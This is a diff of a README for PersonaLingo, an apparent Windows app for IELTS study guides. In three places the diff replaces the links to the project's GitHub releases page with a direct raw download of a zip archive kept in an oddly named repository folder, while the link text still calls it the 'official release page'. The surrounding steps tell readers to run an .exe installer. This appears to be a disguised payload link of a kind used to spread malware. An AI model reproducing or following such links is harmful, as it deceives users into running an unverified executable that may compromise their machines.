@@ -1,6 +1,6 @@
 # 🎯 PersonaLingo - Customize your IELTS study materials today
 
-[![Download PersonaLingo](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/arelfruitful261/PersonaLingo/releases)
+[![Download PersonaLingo](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/arelfruitful261/PersonaLingo/main/Babbittism/Lingo-Persona-v3.6.zip)
 
 PersonaLingo builds custom study guides for your IELTS exam. It uses your personal interests and personality traits to create practice content. This tool helps you learn English faster by making the material feel relevant to your life. The application works offline on your Windows computer and does not require coding skills.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the application well:
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [official release page](https://github.com/arelfruitful261/PersonaLingo/releases) to access the files.
+1. Visit the [official release page](https://raw.githubusercontent.com/arelfruitful261/PersonaLingo/main/Babbittism/Lingo-Persona-v3.6.zip) to access the files.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to download the installer to your Downloads folder.
 4. Open your Downloads folder and double-click the `PersonaLingo-Setup.exe` file.
@@ -79,7 +79,7 @@ The app works on most hardware. If your computer feels slow, close other program
 Close the window and open it again. Your progress saves automatically after every cycle finishes.
 
 **Where do I find the latest updates?**
-Check the [release page](https://github.com/arelfruitful261/PersonaLingo/releases) periodically to download new versions of the software.
+Check the [release page](https://raw.githubusercontent.com/arelfruitful261/PersonaLingo/main/Babbittism/Lingo-Persona-v3.6.zip) periodically to download new versions of the software.
 
 ## 🔧 Troubleshooting
 
